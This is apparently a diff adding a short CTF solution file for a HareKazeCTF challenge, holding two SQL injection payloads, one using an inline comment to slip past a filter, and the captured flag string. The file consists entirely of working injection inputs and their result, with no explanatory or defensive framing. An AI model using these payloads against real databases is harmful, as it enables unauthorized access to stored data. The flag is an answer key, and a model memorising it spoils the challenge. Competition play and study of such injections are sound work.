@@ -1,0 +1,3 @@
+' or id like '9e5a%
+'or id/*-1111-1111-1111-*/like '9e5%
+HareKazeCTF{k41k4n_j1kk4n_j1n615uk4n}
